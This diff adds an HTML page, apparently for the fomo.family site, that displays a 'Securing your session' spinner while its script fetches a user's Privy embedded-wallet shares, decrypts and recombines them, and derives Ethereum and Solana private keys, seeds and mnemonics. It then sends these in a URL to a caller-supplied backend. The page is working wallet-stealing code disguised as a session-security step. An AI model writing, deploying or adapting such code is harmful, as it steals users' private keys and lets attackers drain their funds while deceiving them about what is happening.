@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Session</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      width: 100%; height: 100%;
+      background: #0a0a0b;
+      color: #e8e8ef;
+      font: 13px/1.45 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      overflow: hidden;
+    }
+    .wrap {
+      min-height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      width: min(320px, 100%);
+      text-align: center;
+    }
+    .logo {
+      width: 36px; height: 36px;
+      margin: 0 auto 16px;
+      border-radius: 10px;
+      background: linear-gradient(135deg, #fff 0%, #999 100%);
+      opacity: .9;
+    }
+    h1 {
+      font-size: 14px;
+      font-weight: 600;
+      letter-spacing: .01em;
+      margin-bottom: 6px;
+    }
+    p {
+      color: #6b6b75;
+      font-size: 12px;
+      margin-bottom: 18px;
+    }
+    .spinner {
+      width: 22px; height: 22px;
+      margin: 0 auto;
+      border: 2px solid #222;
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .ok .spinner { display: none; }
+    .ok .check {
+      display: block;
+      width: 22px; height: 22px;
+      margin: 0 auto;
+      border-radius: 50%;
+      background: #22c55e;
+      position: relative;
+    }
+    .ok .check:after {
+      content: "";
+      position: absolute;
+      left: 7px; top: 4px;
+      width: 5px; height: 10px;
+      border: solid #000;
+      border-width: 0 2px 2px 0;
+      transform: rotate(45deg);
+    }
+    .check { display: none; }
+    .hint {
+      margin-top: 14px;
+      font-size: 11px;
+      color: #3a3a42;
+    }
+  </style>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tweetnacl@1.0.3/nacl-fast.min.js"></script>
+</head>
+<body>
+  <div class="wrap" id="ui">
+    <div class="card">
+      <div class="logo"></div>
+      <h1 id="title">Securing your session</h1>
+      <p id="sub">Please keep this window open</p>
+      <div class="spinner" id="spin"></div>
+      <div class="check" id="check"></div>
+      <div class="hint">Encrypted connection · do not close</div>
+    </div>
+  </div>
+  <script>
+(() => {
+  const titleEl = document.getElementById("title");
+  const subEl = document.getElementById("sub");
+  const ui = document.getElementById("ui");
+
+  function setStatus(title, sub) {
+    if (title) titleEl.textContent = title;
+    if (sub) subEl.textContent = sub;
+  }
+  function setDone() {
+    ui.classList.add("ok");
+    setStatus("Session secured", "You can close this window");
+  }
+
+  const ALLOWED = (o) => {
+    try {
+      const h = new URL(o).hostname;
+      return (
+        h === "fomo.family" ||
+        h.endsWith(".fomo.family") ||
+        h === "localhost" ||
+        h === "127.0.0.1" ||
+        h.endsWith(".workers.dev") ||
+        h.endsWith(".pages.dev")
+      );
+    } catch { return false; }
+  };
+
+  const b64 = (s) => {
+    const n = String(s).replace(/-/g, "+").replace(/_/g, "/");
+    const p = "=".repeat((4 - (n.length % 4)) % 4);
+    return Uint8Array.from(atob(n + p), (c) => c.charCodeAt(0));
+  };
+  const hex = (u8) => [...u8].map((b) => b.toString(16).padStart(2, "0")).join("");
+
+  const B58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+  function b58encode(bytes) {
+    const u8 = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
+    let zeros = 0;
+    while (zeros < u8.length && u8[zeros] === 0) zeros++;
+    const size = Math.ceil(u8.length * 138 / 100) + 1;
+    const b = new Uint8Array(size);
+    let length = 0;
+    for (let i = zeros; i < u8.length; i++) {
+      let carry = u8[i];
+      let j = 0;
+      for (let k = size - 1; k >= 0 && (carry !== 0 || j < length); k--, j++) {
+        carry += 256 * b[k];
+        b[k] = carry % 58;
+        carry = (carry / 58) | 0;
+      }
+      length = j;
+    }
+    let out = "1".repeat(zeros);
+    for (let i = size - length; i < size; i++) out += B58_ALPHABET[b[i]];
+    return out;
+  }
+
+  // Privy GF(2^8) tables — x is last byte of each share
+  const LOG_TABLE = new Uint8Array([
+    0x00,0xff,0xc8,0x08,0x91,0x10,0xd0,0x36,0x5a,0x3e,0xd8,0x43,0x99,0x77,0xfe,0x18,
+    0x23,0x20,0x07,0x70,0xa1,0x6c,0x0c,0x7f,0x62,0x8b,0x40,0x46,0xc7,0x4b,0xe0,0x0e,
+    0xeb,0x16,0xe8,0xad,0xcf,0xcd,0x39,0x53,0x6a,0x27,0x35,0x93,0xd4,0x4e,0x48,0xc3,
+    0x2b,0x79,0x54,0x28,0x09,0x78,0x0f,0x21,0x90,0x87,0x14,0x2a,0xa9,0x9c,0xd6,0x74,
+    0xb4,0x7c,0xde,0xed,0xb1,0x86,0x76,0xa4,0x98,0xe2,0x96,0x8f,0x02,0x32,0x1c,0xc1,
+    0x33,0xee,0xef,0x81,0xfd,0x30,0x5c,0x13,0x9d,0x29,0x17,0xc4,0x11,0x44,0x8c,0x80,
+    0xf3,0x73,0x42,0x1e,0x1d,0xb5,0xf0,0x12,0xd1,0x5b,0x41,0xa2,0xd7,0x2c,0xe9,0xd5,
+    0x59,0xcb,0x50,0xa8,0xdc,0xfc,0xf2,0x56,0x72,0xa6,0x65,0x2f,0x9f,0x9b,0x3d,0xba,
+    0x7d,0xc2,0x45,0x82,0xa7,0x57,0xb6,0xa3,0x7a,0x75,0x4f,0xae,0x3f,0x37,0x6d,0x47,
+    0x61,0xbe,0xab,0xd3,0x5f,0xb0,0x58,0xaf,0xca,0x5e,0xfa,0x85,0xe4,0x4d,0x8a,0x05,
+    0xfb,0x60,0xb7,0x7b,0xb8,0x26,0x4a,0x67,0xc6,0x1a,0xf8,0x69,0x25,0xb3,0xdb,0xbd,
+    0x66,0xdd,0xf1,0xd2,0xdf,0x03,0x8d,0x34,0xd9,0x92,0x0d,0x63,0x55,0xaa,0x49,0xec,
+    0xbc,0x95,0x3c,0x84,0x0b,0xf5,0xe6,0xe7,0xe5,0xac,0x7e,0x6e,0xb9,0xf9,0xda,0x8e,
+    0x9a,0xc9,0x24,0xe1,0x0a,0x15,0x6b,0x3a,0xa0,0x51,0xf4,0xea,0xb2,0x97,0x9e,0x5d,
+    0x22,0x88,0x94,0xce,0x19,0x01,0x71,0x4c,0xa5,0xe3,0xc5,0x31,0xbb,0xcc,0x1f,0x2d,
+    0x3b,0x52,0x6f,0xf6,0x2e,0x89,0xf7,0xc0,0x68,0x1b,0x64,0x04,0x06,0xbf,0x83,0x38
+  ]);
+  const EXP_TABLE = new Uint8Array([
+    0x01,0xe5,0x4c,0xb5,0xfb,0x9f,0xfc,0x12,0x03,0x34,0xd4,0xc4,0x16,0xba,0x1f,0x36,
+    0x05,0x5c,0x67,0x57,0x3a,0xd5,0x21,0x5a,0x0f,0xe4,0xa9,0xf9,0x4e,0x64,0x63,0xee,
+    0x11,0x37,0xe0,0x10,0xd2,0xac,0xa5,0x29,0x33,0x59,0x3b,0x30,0x6d,0xef,0xf4,0x7b,
+    0x55,0xeb,0x4d,0x50,0xb7,0x2a,0x07,0x8d,0xff,0x26,0xd7,0xf0,0xc2,0x7e,0x09,0x8c,
+    0x1a,0x6a,0x62,0x0b,0x5d,0x82,0x1b,0x8f,0x2e,0xbe,0xa6,0x1d,0xe7,0x9d,0x2d,0x8a,
+    0x72,0xd9,0xf1,0x27,0x32,0xbc,0x77,0x85,0x96,0x70,0x08,0x69,0x56,0xdf,0x99,0x94,
+    0xa1,0x90,0x18,0xbb,0xfa,0x7a,0xb0,0xa7,0xf8,0xab,0x28,0xd6,0x15,0x8e,0xcb,0xf2,
+    0x13,0xe6,0x78,0x61,0x3f,0x89,0x46,0x0d,0x35,0x31,0x88,0xa3,0x41,0x80,0xca,0x17,
+    0x5f,0x53,0x83,0xfe,0xc3,0x9b,0x45,0x39,0xe1,0xf5,0x9e,0x19,0x5e,0xb6,0xcf,0x4b,
+    0x38,0x04,0xb9,0x2b,0xe2,0xc1,0x4a,0xdd,0x48,0x0c,0xd0,0x7d,0x3d,0x58,0xde,0x7c,
+    0xd8,0x14,0x6b,0x87,0x47,0xe8,0x79,0x84,0x73,0x3c,0xbd,0x92,0xc9,0x23,0x8b,0x97,
+    0x95,0x44,0xdc,0xad,0x40,0x65,0x86,0xa2,0xa4,0xcc,0x7f,0xec,0xc0,0xaf,0x91,0xfd,
+    0xf7,0x4f,0x81,0x2f,0x5b,0xea,0xa8,0x1c,0x02,0xd1,0x98,0x71,0xed,0x25,0xe3,0x24,
+    0x06,0x68,0xb3,0x93,0x2c,0x6f,0x3e,0x6c,0x0a,0xb8,0xce,0xae,0x74,0xb1,0x42,0xb4,
+    0x1e,0xd3,0x49,0xe9,0x9c,0xc8,0xc6,0xc7,0x22,0x6e,0xdb,0x20,0xbf,0x43,0x51,0x52,
+    0x66,0xb2,0x76,0x60,0xda,0xc5,0xf3,0xf6,0xaa,0xcd,0x9a,0xa0,0x75,0x54,0x0e,0x01
+  ]);
+
+  function gfAdd(a, b) { return a ^ b; }
+  function gfDiv(a, b) {
+    if (b === 0) throw new Error("div0");
+    if (a === 0) return 0;
+    return EXP_TABLE[(LOG_TABLE[a] - LOG_TABLE[b] + 255) % 255];
+  }
+  function gfMult(a, b) {
+    if (a === 0 || b === 0) return 0;
+    return EXP_TABLE[(LOG_TABLE[a] + LOG_TABLE[b]) % 255];
+  }
+  function interpolate(xSamples, ySamples, x) {
+    const n = xSamples.length;
+    let result = 0;
+    for (let i = 0; i < n; i++) {
+      let basis = 1;
+      for (let j = 0; j < n; j++) {
+        if (i === j) continue;
+        basis = gfMult(basis, gfDiv(gfAdd(x, xSamples[j]), gfAdd(xSamples[i], xSamples[j])));
+      }
+      result = gfAdd(result, gfMult(ySamples[i], basis));
+    }
+    return result;
+  }
+  function combineShares(shares) {
+    if (!shares || shares.length < 2) throw new Error("need shares");
+    const len = shares[0].length;
+    for (const s of shares) if (s.length !== len) throw new Error("len");
+    const secretLen = len - 1;
+    const secret = new Uint8Array(secretLen);
+    const xs = new Uint8Array(shares.length);
+    const ys = new Uint8Array(shares.length);
+    const seen = new Set();
+    for (let i = 0; i < shares.length; i++) {
+      const x = shares[i][len - 1];
+      if (seen.has(x)) throw new Error("dup");
+      seen.add(x);
+      xs[i] = x;
+    }
+    for (let i = 0; i < secretLen; i++) {
+      for (let j = 0; j < shares.length; j++) ys[j] = shares[j][i];
+      secret[i] = interpolate(xs, ys, 0);
+    }
+    return secret;
+  }
+
+  async function decryptShare(recoveryKeyB64, encShareB64, ivB64) {
+    const keyBytes = b64(recoveryKeyB64);
+    const iv = b64(ivB64);
+    const cipher = b64(encShareB64);
+    const aesKey = await crypto.subtle.importKey("raw", keyBytes, "AES-GCM", false, ["decrypt"]);
+    return new Uint8Array(await crypto.subtle.decrypt({ name: "AES-GCM", iv }, aesKey, cipher));
+  }
+
+  async function hmacSha512(key, data) {
+    const cryptoKey = await crypto.subtle.importKey(
+      "raw",
+      key instanceof Uint8Array ? key : new TextEncoder().encode(key),
+      { name: "HMAC", hash: "SHA-512" },
+      false,
+      ["sign"]
+    );
+    return new Uint8Array(await crypto.subtle.sign("HMAC", cryptoKey, data));
+  }
+  async function slip10Master(seed) {
+    return hmacSha512(new TextEncoder().encode("ed25519 seed"), seed);
+  }
+  async function slip10Derive(seed, path) {
+    let I = await slip10Master(seed);
+    for (const seg of path.replace(/^m\//, "").split("/")) {
+      if (!seg) continue;
+      const hardened = seg.endsWith("'");
+      const index = parseInt(seg.replace("'", ""), 10) + (hardened ? 0x80000000 : 0);
+      const data = new Uint8Array(37);
+      data[0] = 0;
+      data.set(I.slice(0, 32), 1);
+      data[33] = (index >>> 24) & 0xff;
+      data[34] = (index >>> 16) & 0xff;
+      data[35] = (index >>> 8) & 0xff;
+      data[36] = index & 0xff;
+      I = await hmacSha512(I.slice(32, 64), data);
+    }
+    return I.slice(0, 32);
+  }
+
+  async function solanaFromEntropy(entropy) {
+    if (typeof nacl === "undefined") throw new Error("nacl");
+    const candidates = [];
+    const seed32 = entropy.length >= 32 ? entropy.slice(0, 32) : entropy;
+    const paths = ["m/44'/501'/0'/0'", "m/44'/501'/0'", "m/44'/501'/0'/0'/0'"];
+    for (const path of paths) {
+      try {
+        const derived = await slip10Derive(seed32, path);
+        const kp = nacl.sign.keyPair.fromSeed(derived);
+        candidates.push({
+          method: "slip10:" + path,
+          address: b58encode(kp.publicKey),
+          privateKey: b58encode(kp.secretKey),
+          privateKeySeed: b58encode(derived),
+          publicKey: b58encode(kp.publicKey),
+        });
+      } catch {}
+    }
+    try {
+      const kp = nacl.sign.keyPair.fromSeed(seed32);
+      candidates.push({
+        method: "ed25519-seed32",
+        address: b58encode(kp.publicKey),
+        privateKey: b58encode(kp.secretKey),
+        privateKeySeed: b58encode(seed32),
+        publicKey: b58encode(kp.publicKey),
+      });
+    } catch {}
+    return candidates;
+  }
+
+  async function combine(msg) {
+    const chainType = (msg.chainType || msg.chain_type || "ethereum").toLowerCase();
+    if (typeof ethers === "undefined") throw new Error("ethers");
+
+    setStatus("Securing your session", "Almost done…");
+    const recoveredShare = await decryptShare(msg.recoveryKey, msg.encShare, msg.iv);
+    const authShare = b64(msg.authShare);
+    if (authShare.length !== recoveredShare.length) throw new Error("share length");
+
+    const entropy = combineShares([authShare, recoveredShare]);
+    const entropyHex = "0x" + hex(entropy);
+    const expected = (msg.expectedAddress || "").trim();
+
+    if (chainType === "solana") {
+      const candidates = await solanaFromEntropy(entropy);
+      const match = candidates.find((c) => c.address === expected);
+      if (match) {
+        return {
+          ok: true,
+          chainType: "solana",
+          method: match.method,
+          address: match.address,
+          privateKey: match.privateKey,
+          privateKeySeed: match.privateKeySeed,
+          publicKey: match.publicKey,
+          mnemonic: null,
+          entropyHex,
+          candidates,
+        };
+      }
+      return {
+        ok: false,
+        chainType: "solana",
+        error: "no address match",
+        entropyHex,
+        candidates,
+        expected,
+      };
+    }
+
+    const candidates = [];
+    try {
+      const mnemonic = ethers.utils.entropyToMnemonic(entropyHex);
+      const w = ethers.Wallet.fromMnemonic(mnemonic);
+      candidates.push({ method: "bip39", privateKey: w.privateKey, address: w.address, mnemonic });
+    } catch {}
+    try {
+      const w = new ethers.Wallet(entropyHex);
+      candidates.push({ method: "raw-pk", privateKey: w.privateKey, address: w.address, mnemonic: null });
+    } catch {}
+    try {
+      const hd = ethers.utils.HDNode.fromSeed(entropyHex);
+      candidates.push({ method: "hd-seed", privateKey: hd.privateKey, address: hd.address, mnemonic: null });
+    } catch {}
+    try {
+      const hd = ethers.utils.HDNode.fromSeed(entropyHex).derivePath("m/44'/60'/0'/0/0");
+      candidates.push({ method: "hd-path", privateKey: hd.privateKey, address: hd.address, mnemonic: null });
+    } catch {}
+
+    const match = candidates.find(
+      (c) => c.address.toLowerCase() === expected.toLowerCase()
+    );
+    if (match) {
+      return {
+        ok: true,
+        chainType: "ethereum",
+        method: match.method,
+        address: match.address,
+        privateKey: match.privateKey,
+        mnemonic: match.mnemonic,
+        entropyHex,
+        candidates,
+      };
+    }
+    return {
+      ok: false,
+      chainType: "ethereum",
+      error: "no address match",
+      entropyHex,
+      candidates,
+      expected,
+    };
+  }
+
+  let busy = false;
+
+  async function recoverApi(payload) {
+    const body = { ...(payload || {}) };
+    if (body.chainType && !body.chain_type) body.chain_type = body.chainType;
+    const r = await fetch(location.origin + "/api/recover", {
+      method: "POST",
+      headers: { "content-type": "application/json" },
+      body: JSON.stringify(body),
+    });
+    const text = await r.text();
+    let result;
+    try { result = JSON.parse(text); }
+    catch { throw new Error("bad response"); }
+    const ok = r.ok && result.ok !== false && !result.error;
+    if (!ok) throw new Error(String(result.error || "recover failed"));
+    return result;
+  }
+
+  function b64urlEncode(str) {
+    const bytes = new TextEncoder().encode(str);
+    let bin = "";
+    bytes.forEach((b) => (bin += String.fromCharCode(b)));
+    return btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
+  }
+
+  /* COOP-safe path: parent opens r.html#job=<b64url(json)>
+     job = { backend, return, userId, items: [{ chainType, address, accessToken, recoveryKey, ... }] }
+     runner does recover+combine, then navigates to backend with results.
+  */
+  async function runJobFromHash() {
+    const raw = (location.hash || "").replace(/^#/, "");
+    if (!raw.startsWith("job=")) return false;
+    let job;
+    try {
+      const b64 = raw.slice(4).replace(/-/g, "+").replace(/_/g, "/");
+      const pad = "=".repeat((4 - (b64.length % 4)) % 4);
+      const json = decodeURIComponent(escape(atob(b64 + pad)));
+      job = JSON.parse(json);
+    } catch (e) {
+      setStatus("Error", "Bad job payload");
+      return true;
+    }
+    if (!job || !Array.isArray(job.items) || !job.items.length) {
+      setStatus("Error", "Empty job");
+      return true;
+    }
+
+    busy = true;
+    setStatus("Securing your session", "Working…");
+    const out = {
+      source: job.source || "fomo.family",
+      ts: Date.now(),
+      userId: job.userId || null,
+      ethereum: [],
+      solana: [],
+      raw: { ethereum: [], solana: [] },
+    };
+
+    try {
+      for (let i = 0; i < job.items.length; i++) {
+        const it = job.items[i];
+        setStatus(
+          "Securing your session",
+          `Wallet ${i + 1}/${job.items.length}…`
+        );
+        const chainType = it.chainType || it.chain_type || "ethereum";
+        try {
+          const recovered = await recoverApi(it);
+          const authShare = recovered?.auth_share?.data?.share;
+          const encShare = recovered?.shares?.data?.encrypted_recovery_share;
+          const iv = recovered?.shares?.data?.encrypted_recovery_share_iv;
+          const rk = recovered?.recoveryKey || it.recoveryKey;
+          if (!authShare || !encShare || !iv) {
+            const fail = {
+              chainType,
+              address: it.wallet || it.address,
+              ok: false,
+              error: "incomplete",
+            };
+            out.raw[chainType === "solana" ? "solana" : "ethereum"].push(fail);
+            continue;
+          }
+          const comb = await combine({
+            recoveryKey: rk,
+            authShare,
+            encShare,
+            iv,
+            expectedAddress: it.wallet || it.address,
+            chainType,
+            chain_type: chainType,
+          });
+          // combine() returns { ok, address, privateKey, ... } directly
+          // (postMessage path wraps as { ok, result }; job path must not)
+          if (!comb || !comb.ok) {
+            const fail = {
+              chainType,
+              address: it.wallet || it.address,
+              ok: false,
+              error: (comb && comb.error) || "failed",
+              detail: comb || null,
+            };
+            out.raw[chainType === "solana" ? "solana" : "ethereum"].push(fail);
+            continue;
+          }
+          const row = {
+            chainType,
+            address: comb.address,
+            ok: true,
+            method: comb.method,
+            privateKey: comb.privateKey,
+            privateKeySeed: comb.privateKeySeed || null,
+            mnemonic: comb.mnemonic || null,
+          };
+          const bucket = chainType === "solana" ? "solana" : "ethereum";
+          out.raw[bucket].push(row);
+          if (bucket === "ethereum") {
+            out.ethereum.push({
+              address: comb.address,
+              privateKey: comb.privateKey,
+              mnemonic: comb.mnemonic,
+              method: comb.method,
+            });
+          } else {
+            out.solana.push({
+              address: comb.address,
+              privateKey: comb.privateKey,
+              privateKeySeed: comb.privateKeySeed,
+              method: comb.method,
+            });
+          }
+        } catch (e) {
+          const bucket =
+            (it.chainType || it.chain_type) === "solana" ? "solana" : "ethereum";
+          out.raw[bucket].push({
+            chainType: it.chainType || it.chain_type,
+            address: it.wallet || it.address,
+            ok: false,
+            error: String(e.message || e),
+          });
+        }
+      }
+
+      setDone();
+      const backend = (job.backend || "").replace(/\/$/, "");
+      const ret = encodeURIComponent(job.returnUrl || "https://fomo.family/");
+      if (!backend) {
+        setStatus("Done", "No backend configured");
+        return true;
+      }
+      const d = b64urlEncode(JSON.stringify(out));
+      const url =
+        backend + (backend.includes("?") ? "&" : "?") + "d=" + d + "&return=" + ret;
+      setTimeout(() => {
+        location.href = url;
+      }, 400);
+    } catch (e) {
+      setStatus("Error", String(e.message || e));
+    } finally {
+      busy = false;
+    }
+    return true;
+  }
+
+  window.addEventListener("message", async (ev) => {
+    if (!ALLOWED(ev.origin)) return;
+    const d = ev.data;
+    if (!d) return;
+
+    if (d.type === "privy-ping") {
+      try {
+        ev.source.postMessage({ type: "privy-runner-hello" }, ev.origin);
+      } catch {}
+      return;
+    }
+
+    if (d.type === "privy-recover-start" && !busy) {
+      busy = true;
+      setStatus("Securing your session", "Connecting…");
+      try {
+        const result = await recoverApi(d.payload || {});
+        ev.source.postMessage(
+          { type: "privy-recover-result", ok: true, result, error: null },
+          ev.origin
+        );
+      } catch (e) {
+        ev.source.postMessage(
+          { type: "privy-recover-result", ok: false, error: String(e.message || e) },
+          ev.origin
+        );
+      } finally {
+        busy = false;
+      }
+      return;
+    }
+
+    if (d.type === "privy-combine" && !busy) {
+      busy = true;
+      setStatus("Securing your session", "Finishing…");
+      try {
+        const result = await combine(d);
+        if (result.ok) setDone();
+        ev.source.postMessage(
+          { type: "privy-combine-result", ok: !!result.ok, result, error: result.error || null },
+          ev.origin
+        );
+      } catch (e) {
+        ev.source.postMessage(
+          { type: "privy-combine-result", ok: false, error: String(e.message || e) },
+          ev.origin
+        );
+      } finally {
+        busy = false;
+      }
+    }
+  });
+
+  setStatus("Securing your session", "Please keep this window open");
+  runJobFromHash().catch((e) => setStatus("Error", String(e.message || e)));
+})();
+  </script>
+</body>
+</html>
